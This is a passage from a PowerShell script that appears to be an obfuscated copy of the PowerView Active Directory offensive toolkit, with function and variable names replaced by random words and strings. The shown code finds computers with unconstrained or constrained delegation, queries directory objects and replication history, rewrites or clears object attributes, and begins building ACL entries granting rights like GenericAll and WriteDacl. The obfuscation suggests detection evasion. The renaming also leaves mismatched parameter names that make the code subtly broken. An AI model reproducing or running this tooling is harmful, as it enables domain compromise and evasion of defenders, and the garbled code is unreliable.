        if ($PSBoundParameters['ResultPageSize']) { $XVFWmInN99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $XVFWmInN99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['SecurityMasks']) { $XVFWmInN99['SecurityMasks'] = $azVlDiTB99 }
        if ($PSBoundParameters['Tombstone']) { $XVFWmInN99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $XVFWmInN99['Credential'] = $fjBNCklg99 }
        $QjmWfrwU99 = maroons @SearcherArguments
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            preventive -mBmtwKgS99 -URtDicpQ99 $PSBoundParameters
        }
        if ($QjmWfrwU99) {
            $igkjuUBu99 = ''
            $pIJjStMG99 = ''
            $feaYcbZI99 | Where-Object {$_} | ForEach-Object {
                $vNrdYYXO99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($vNrdYYXO99 -match '^S-1-') {
                    $igkjuUBu99 += "(objectsid=$vNrdYYXO99)"
                }
                elseif ($vNrdYYXO99 -match '^CN=') {
                    $igkjuUBu99 += "(distinguishedname=$vNrdYYXO99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $CtdjjEVe99 = $vNrdYYXO99.SubString($vNrdYYXO99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[cowing] Extracted domain '$CtdjjEVe99' from '$vNrdYYXO99'"
                        $XVFWmInN99['Domain'] = $CtdjjEVe99
                        $QjmWfrwU99 = maroons @SearcherArguments
                        if (-not $QjmWfrwU99) {
                            Write-Warning "[cowing] Unable to retrieve domain searcher for '$CtdjjEVe99'"
                        }
                    }
                }
                elseif ($vNrdYYXO99.Contains('.')) {
                    $igkjuUBu99 += "(|(name=$vNrdYYXO99)(dnshostname=$vNrdYYXO99))"
                }
                elseif ($vNrdYYXO99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $VAqEOfOY99 = (([Guid]$vNrdYYXO99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $igkjuUBu99 += "(objectguid=$VAqEOfOY99)"
                }
                else {
                    $igkjuUBu99 += "(name=$vNrdYYXO99)"
                }
            }
            if ($igkjuUBu99 -and ($igkjuUBu99.Trim() -ne '') ) {
                $pIJjStMG99 += "(|$igkjuUBu99)"
            }
            if ($PSBoundParameters['Unconstrained']) {
                Write-Verbose '[cowing] Searching for computers with for unconstrained delegation'
                $pIJjStMG99 += '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[cowing] Searching for computers that are trusted to authenticate for other principals'
                $pIJjStMG99 += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['Printers']) {
                Write-Verbose '[cowing] Searching for printers'
                $pIJjStMG99 += '(objectCategory=printQueue)'
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose "[cowing] Searching for computers with SPN: $SPN"
                $pIJjStMG99 += "(servicePrincipalName=$SPN)"
            }
            if ($PSBoundParameters['OperatingSystem']) {
                Write-Verbose "[cowing] Searching for computers with operating system: $rqmKHnWu99"
                $pIJjStMG99 += "(operatingsystem=$rqmKHnWu99)"
            }
            if ($PSBoundParameters['ServicePack']) {
                Write-Verbose "[cowing] Searching for computers with service pack: $gNnwgaEV99"
                $pIJjStMG99 += "(operatingsystemservicepack=$gNnwgaEV99)"
            }
            if ($PSBoundParameters['SiteName']) {
                Write-Verbose "[cowing] Searching for computers with site name: $iSntscLt99"
                $pIJjStMG99 += "(serverreferencebl=$iSntscLt99)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[cowing] Using additional LDAP filter: $SeHRgLsL99"
                $pIJjStMG99 += "$SeHRgLsL99"
            }
            $HHRLoZva99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $OeZYtPdt99 = $_.Substring(4)
                    $KTofVmua99 = [Int]($XhWoAzaE99::$OeZYtPdt99)
                    $pIJjStMG99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$KTofVmua99))"
                }
                else {
                    $KTofVmua99 = [Int]($XhWoAzaE99::$_)
                    $pIJjStMG99 += "(userAccountControl:1.2.840.113556.1.4.803:=$KTofVmua99)"
                }
            }
            $QjmWfrwU99.filter = "(&(samAccountType=805306369)$pIJjStMG99)"
            Write-Verbose "[cowing] cowing filter string: $($QjmWfrwU99.filter)"
            if ($PSBoundParameters['FindOne']) { $CmGXBhUd99 = $QjmWfrwU99.FindOne() }
            else { $CmGXBhUd99 = $QjmWfrwU99.FindAll() }
            $CmGXBhUd99 | Where-Object {$_} | ForEach-Object {
                $Up = $True
                if ($PSBoundParameters['Ping']) {
                    $Up = Test-Connection -Count 1 -Quiet -cSHFXHUa99 $_.properties.dnshostname
                }
                if ($Up) {
                    if ($PSBoundParameters['Raw']) {
                        $GocAGaEB99 = $_
                        $GocAGaEB99.PSObject.TypeNames.Insert(0, 'PowerView.Computer.Raw')
                    }
                    else {
                        $GocAGaEB99 = foregather -ycQOyvWh99 $_.Properties
                        $GocAGaEB99.PSObject.TypeNames.Insert(0, 'PowerView.Computer')
                    }
                    $GocAGaEB99
                }
            }
            if ($CmGXBhUd99) {
                try { $CmGXBhUd99.dispose() }
                catch {
                    Write-Verbose "[cowing] Error disposing of the Results object: $_"
                }
            }
            $QjmWfrwU99.dispose()
        }
    }
}
function trashier {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObject')]
    [OutputType('PowerView.ADObject.Raw')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $feaYcbZI99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $SeHRgLsL99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ycQOyvWh99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $WdOnSHnL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $azVlDiTB99,
        [Switch]
        $rmzHuzlC99,
        [Alias('ReturnOne')]
        [Switch]
        $cIwTZAKh99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        $fokrrvjQ99 = [Enum]::GetNames($XhWoAzaE99)
        $fokrrvjQ99 = $fokrrvjQ99 | ForEach-Object {$_; "NOT_$_"}
        preventive -Name UACFilter -tBIdqNFz99 $fokrrvjQ99 -Type ([array])
    }
    BEGIN {
        $XVFWmInN99 = @{}
        if ($PSBoundParameters['Domain']) { $XVFWmInN99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['Properties']) { $XVFWmInN99['Properties'] = $ycQOyvWh99 }
        if ($PSBoundParameters['SearchBase']) { $XVFWmInN99['SearchBase'] = $WdOnSHnL99 }
        if ($PSBoundParameters['Server']) { $XVFWmInN99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $XVFWmInN99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $XVFWmInN99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $XVFWmInN99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['SecurityMasks']) { $XVFWmInN99['SecurityMasks'] = $azVlDiTB99 }
        if ($PSBoundParameters['Tombstone']) { $XVFWmInN99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $XVFWmInN99['Credential'] = $fjBNCklg99 }
        $wsfKvtio99 = maroons @SearcherArguments
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            preventive -mBmtwKgS99 -URtDicpQ99 $PSBoundParameters
        }
        if ($wsfKvtio99) {
            $igkjuUBu99 = ''
            $pIJjStMG99 = ''
            $feaYcbZI99 | Where-Object {$_} | ForEach-Object {
                $vNrdYYXO99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($vNrdYYXO99 -match '^S-1-') {
                    $igkjuUBu99 += "(objectsid=$vNrdYYXO99)"
                }
                elseif ($vNrdYYXO99 -match '^(CN|OU|DC)=') {
                    $igkjuUBu99 += "(distinguishedname=$vNrdYYXO99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $CtdjjEVe99 = $vNrdYYXO99.SubString($vNrdYYXO99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[trashier] Extracted domain '$CtdjjEVe99' from '$vNrdYYXO99'"
                        $XVFWmInN99['Domain'] = $CtdjjEVe99
                        $wsfKvtio99 = maroons @SearcherArguments
                        if (-not $wsfKvtio99) {
                            Write-Warning "[trashier] Unable to retrieve domain searcher for '$CtdjjEVe99'"
                        }
                    }
                }
                elseif ($vNrdYYXO99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $VAqEOfOY99 = (([Guid]$vNrdYYXO99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $igkjuUBu99 += "(objectguid=$VAqEOfOY99)"
                }
                elseif ($vNrdYYXO99.Contains('\')) {
                    $amRsUbps99 = $vNrdYYXO99.Replace('\28', '(').Replace('\29', ')') | offings -EsfqZxkA99 Canonical
                    if ($amRsUbps99) {
                        $nxwoMeCt99 = $amRsUbps99.SubString(0, $amRsUbps99.IndexOf('/'))
                        $GwxiGtHr99 = $vNrdYYXO99.Split('\')[1]
                        $igkjuUBu99 += "(samAccountName=$GwxiGtHr99)"
                        $XVFWmInN99['Domain'] = $nxwoMeCt99
                        Write-Verbose "[trashier] Extracted domain '$nxwoMeCt99' from '$vNrdYYXO99'"
                        $wsfKvtio99 = maroons @SearcherArguments
                    }
                }
                elseif ($vNrdYYXO99.Contains('.')) {
                    $igkjuUBu99 += "(|(samAccountName=$vNrdYYXO99)(name=$vNrdYYXO99)(dnshostname=$vNrdYYXO99))"
                }
                else {
                    $igkjuUBu99 += "(|(samAccountName=$vNrdYYXO99)(name=$vNrdYYXO99)(displayname=$vNrdYYXO99))"
                }
            }
            if ($igkjuUBu99 -and ($igkjuUBu99.Trim() -ne '') ) {
                $pIJjStMG99 += "(|$igkjuUBu99)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[trashier] Using additional LDAP filter: $SeHRgLsL99"
                $pIJjStMG99 += "$SeHRgLsL99"
            }
            $HHRLoZva99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $OeZYtPdt99 = $_.Substring(4)
                    $KTofVmua99 = [Int]($XhWoAzaE99::$OeZYtPdt99)
                    $pIJjStMG99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$KTofVmua99))"
                }
                else {
                    $KTofVmua99 = [Int]($XhWoAzaE99::$_)
                    $pIJjStMG99 += "(userAccountControl:1.2.840.113556.1.4.803:=$KTofVmua99)"
                }
            }
            if ($pIJjStMG99 -and $pIJjStMG99 -ne '') {
                $wsfKvtio99.filter = "(&$pIJjStMG99)"
            }
            Write-Verbose "[trashier] trashier filter string: $($wsfKvtio99.filter)"
            if ($PSBoundParameters['FindOne']) { $CmGXBhUd99 = $wsfKvtio99.FindOne() }
            else { $CmGXBhUd99 = $wsfKvtio99.FindAll() }
            $CmGXBhUd99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $Object = $_
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject.Raw')
                }
                else {
                    $Object = foregather -ycQOyvWh99 $_.Properties
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject')
                }
                $Object
            }
            if ($CmGXBhUd99) {
                try { $CmGXBhUd99.dispose() }
                catch {
                    Write-Verbose "[trashier] Error disposing of the Results object: $_"
                }
            }
            $wsfKvtio99.dispose()
        }
    }
}
function corm {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $feaYcbZI99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $SeHRgLsL99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ycQOyvWh99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $WdOnSHnL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [Switch]
        $rmzHuzlC99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $XVFWmInN99 = @{
            'Properties'    =   'msds-replattributemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $XVFWmInN99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['LDAPFilter']) { $XVFWmInN99['LDAPFilter'] = $SeHRgLsL99 }
        if ($PSBoundParameters['SearchBase']) { $XVFWmInN99['SearchBase'] = $WdOnSHnL99 }
        if ($PSBoundParameters['Server']) { $XVFWmInN99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $XVFWmInN99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $XVFWmInN99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $XVFWmInN99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Tombstone']) { $XVFWmInN99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['FindOne']) { $XVFWmInN99['FindOne'] = $cIwTZAKh99 }
        if ($PSBoundParameters['Credential']) { $XVFWmInN99['Credential'] = $fjBNCklg99 }
        if ($PSBoundParameters['Properties']) {
            $lyzHMSvw99 = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $lyzHMSvw99 = ''
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $XVFWmInN99['Identity'] = $feaYcbZI99 }
        trashier @SearcherArguments | ForEach-Object {
            $GXfnLfMX99 = $_.Properties['distinguishedname'][0]
            ForEach($JiEhDHSa99 in $_.Properties['msds-replattributemetadata']) {
                $mNYJTdZw99 = [xml]$JiEhDHSa99 | Select-Object -ExpandProperty 'DS_REPL_ATTR_META_DATA' -ErrorAction SilentlyContinue
                if ($mNYJTdZw99) {
                    if ($mNYJTdZw99.pszAttributeName -Match $lyzHMSvw99) {
                        $YrLtLWOk99 = New-Object PSObject
                        $YrLtLWOk99 | Add-Member NoteProperty 'ObjectDN' $GXfnLfMX99
                        $YrLtLWOk99 | Add-Member NoteProperty 'AttributeName' $mNYJTdZw99.pszAttributeName
                        $YrLtLWOk99 | Add-Member NoteProperty 'LastOriginatingChange' $mNYJTdZw99.ftimeLastOriginatingChange
                        $YrLtLWOk99 | Add-Member NoteProperty 'Version' $mNYJTdZw99.dwVersion
                        $YrLtLWOk99 | Add-Member NoteProperty 'LastOriginatingDsaDN' $mNYJTdZw99.pszLastOriginatingDsaDN
                        $YrLtLWOk99.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectAttributeHistory')
                        $YrLtLWOk99
                    }
                }
                else {
                    Write-Verbose "[corm] Error retrieving 'msds-replattributemetadata' for '$GXfnLfMX99'"
                }
            }
        }
    }
}
function violation {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectLinkedAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $feaYcbZI99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $SeHRgLsL99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ycQOyvWh99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $WdOnSHnL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [Switch]
        $rmzHuzlC99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $XVFWmInN99 = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $XVFWmInN99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['LDAPFilter']) { $XVFWmInN99['LDAPFilter'] = $SeHRgLsL99 }
        if ($PSBoundParameters['SearchBase']) { $XVFWmInN99['SearchBase'] = $WdOnSHnL99 }
        if ($PSBoundParameters['Server']) { $XVFWmInN99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $XVFWmInN99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $XVFWmInN99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $XVFWmInN99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Tombstone']) { $XVFWmInN99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $XVFWmInN99['Credential'] = $fjBNCklg99 }
        if ($PSBoundParameters['Properties']) {
            $lyzHMSvw99 = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $lyzHMSvw99 = ''
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $XVFWmInN99['Identity'] = $feaYcbZI99 }
        trashier @SearcherArguments | ForEach-Object {
            $GXfnLfMX99 = $_.Properties['distinguishedname'][0]
            ForEach($JiEhDHSa99 in $_.Properties['msds-replvaluemetadata']) {
                $mNYJTdZw99 = [xml]$JiEhDHSa99 | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($mNYJTdZw99) {
                    if ($mNYJTdZw99.pszAttributeName -Match $lyzHMSvw99) {
                        $YrLtLWOk99 = New-Object PSObject
                        $YrLtLWOk99 | Add-Member NoteProperty 'ObjectDN' $GXfnLfMX99
                        $YrLtLWOk99 | Add-Member NoteProperty 'AttributeName' $mNYJTdZw99.pszAttributeName
                        $YrLtLWOk99 | Add-Member NoteProperty 'AttributeValue' $mNYJTdZw99.pszObjectDn
                        $YrLtLWOk99 | Add-Member NoteProperty 'TimeCreated' $mNYJTdZw99.ftimeCreated
                        $YrLtLWOk99 | Add-Member NoteProperty 'TimeDeleted' $mNYJTdZw99.ftimeDeleted
                        $YrLtLWOk99 | Add-Member NoteProperty 'LastOriginatingChange' $mNYJTdZw99.ftimeLastOriginatingChange
                        $YrLtLWOk99 | Add-Member NoteProperty 'Version' $mNYJTdZw99.dwVersion
                        $YrLtLWOk99 | Add-Member NoteProperty 'LastOriginatingDsaDN' $mNYJTdZw99.pszLastOriginatingDsaDN
                        $YrLtLWOk99.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectLinkedAttributeHistory')
                        $YrLtLWOk99
                    }
                }
                else {
                    Write-Verbose "[violation] Error retrieving 'msds-replvaluemetadata' for '$GXfnLfMX99'"
                }
            }
        }
    }
}
function extorting {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $feaYcbZI99,
        [ValidateNotNullOrEmpty()]
        [Alias('Replace')]
        [Hashtable]
        $Set,
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $XOR,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Clear,
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $SeHRgLsL99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $WdOnSHnL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [Switch]
        $rmzHuzlC99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $XVFWmInN99 = @{'Raw' = $True}
        if ($PSBoundParameters['Domain']) { $XVFWmInN99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['LDAPFilter']) { $XVFWmInN99['LDAPFilter'] = $SeHRgLsL99 }
        if ($PSBoundParameters['SearchBase']) { $XVFWmInN99['SearchBase'] = $WdOnSHnL99 }
        if ($PSBoundParameters['Server']) { $XVFWmInN99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $XVFWmInN99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $XVFWmInN99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $XVFWmInN99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['Tombstone']) { $XVFWmInN99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $XVFWmInN99['Credential'] = $fjBNCklg99 }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $XVFWmInN99['Identity'] = $feaYcbZI99 }
        $XgbJpRnI99 = trashier @SearcherArguments
        ForEach ($Object in $XgbJpRnI99) {
            $Entry = $XgbJpRnI99.GetDirectoryEntry()
            if($PSBoundParameters['Set']) {
                try {
                    $PSBoundParameters['Set'].GetEnumerator() | ForEach-Object {
                        Write-Verbose "[extorting] Setting '$($_.Name)' to '$($_.Value)' for object '$($XgbJpRnI99.Properties.samaccountname)'"
                        $Entry.put($_.Name, $_.Value)
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[extorting] Error setting/replacing properties for object '$($XgbJpRnI99.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['XOR']) {
                try {
                    $PSBoundParameters['XOR'].GetEnumerator() | ForEach-Object {
                        $RJwdWyeE99 = $_.Name
                        $ENshoqwg99 = $_.Value
                        Write-Verbose "[extorting] XORing '$RJwdWyeE99' with '$ENshoqwg99' for object '$($XgbJpRnI99.Properties.samaccountname)'"
                        $eZaVIbzA99 = $Entry.$RJwdWyeE99[0].GetType().name
                        $mLWuAGOg99 = $($Entry.$RJwdWyeE99) -bxor $ENshoqwg99
                        $Entry.$RJwdWyeE99 = $mLWuAGOg99 -as $eZaVIbzA99
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[extorting] Error XOR'ing properties for object '$($XgbJpRnI99.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['Clear']) {
                try {
                    $PSBoundParameters['Clear'] | ForEach-Object {
                        $RJwdWyeE99 = $_
                        Write-Verbose "[extorting] Clearing '$RJwdWyeE99' for object '$($XgbJpRnI99.Properties.samaccountname)'"
                        $Entry.$RJwdWyeE99.clear()
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[extorting] Error clearing properties for object '$($XgbJpRnI99.Properties.samaccountname)' : $_"
                }
            }
        }
    }
}
function yanked {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonHours')]
    [CmdletBinding()]
    Param (
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        $GbmdWiDv99
    )
    Begin {
        if($GbmdWiDv99.Count -ne 21) {
            throw "LogonHoursArray is the incorrect length"
        }
        function scholarships {
            Param (
                [int[]]
                $HNXYBQim99
            )
            $MvGEIbLZ99 = New-Object bool[] 24
            for($i=0; $i -lt 3; $i++) {
                $Byte = $HNXYBQim99[$i]
                $TlmuwuKV99 = $i * 8
                $Str = [Convert]::ToString($Byte,2).PadLeft(8,'0')
                $MvGEIbLZ99[$TlmuwuKV99+0] = [bool] [convert]::ToInt32([string]$Str[7])
                $MvGEIbLZ99[$TlmuwuKV99+1] = [bool] [convert]::ToInt32([string]$Str[6])
                $MvGEIbLZ99[$TlmuwuKV99+2] = [bool] [convert]::ToInt32([string]$Str[5])
                $MvGEIbLZ99[$TlmuwuKV99+3] = [bool] [convert]::ToInt32([string]$Str[4])
                $MvGEIbLZ99[$TlmuwuKV99+4] = [bool] [convert]::ToInt32([string]$Str[3])
                $MvGEIbLZ99[$TlmuwuKV99+5] = [bool] [convert]::ToInt32([string]$Str[2])
                $MvGEIbLZ99[$TlmuwuKV99+6] = [bool] [convert]::ToInt32([string]$Str[1])
                $MvGEIbLZ99[$TlmuwuKV99+7] = [bool] [convert]::ToInt32([string]$Str[0])
            }
            $MvGEIbLZ99
        }
    }
    Process {
        $YrLtLWOk99 = @{
            Sunday = scholarships -HNXYBQim99 $GbmdWiDv99[0..2]
            Monday = scholarships -HNXYBQim99 $GbmdWiDv99[3..5]
            Tuesday = scholarships -HNXYBQim99 $GbmdWiDv99[6..8]
            Wednesday = scholarships -HNXYBQim99 $GbmdWiDv99[9..11]
            Thurs = scholarships -HNXYBQim99 $GbmdWiDv99[12..14]
            Friday = scholarships -HNXYBQim99 $GbmdWiDv99[15..17]
            Saturday = scholarships -HNXYBQim99 $GbmdWiDv99[18..20]
        }
        $YrLtLWOk99 = New-Object PSObject -Property $YrLtLWOk99
        $YrLtLWOk99.PSObject.TypeNames.Insert(0, 'PowerView.LogonHours')
        $YrLtLWOk99
    }
}
function Chapultepec {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Security.AccessControl.AuthorizationRule')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True, Mandatory = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $AvODPONO99,
        [ValidateNotNullOrEmpty()]
        [String]
        $PfltRDOv99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [Switch]
        $rmzHuzlC99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $True)]
        [ValidateSet('AccessSystemSecurity', 'CreateChild','Delete','DeleteChild','DeleteTree','ExtendedRight','GenericAll','GenericExecute','GenericRead','GenericWrite','ListChildren','ListObject','ReadControl','ReadProperty','Self','Synchronize','WriteDacl','WriteOwner','WriteProperty')]
        $Right,
        [Parameter(Mandatory = $True, ParameterSetName='AccessRuleType')]
        [ValidateSet('Allow', 'Deny')]
        [String[]]
        $akrYTvEi99,
        [Parameter(Mandatory = $True, ParameterSetName='AuditRuleType')]
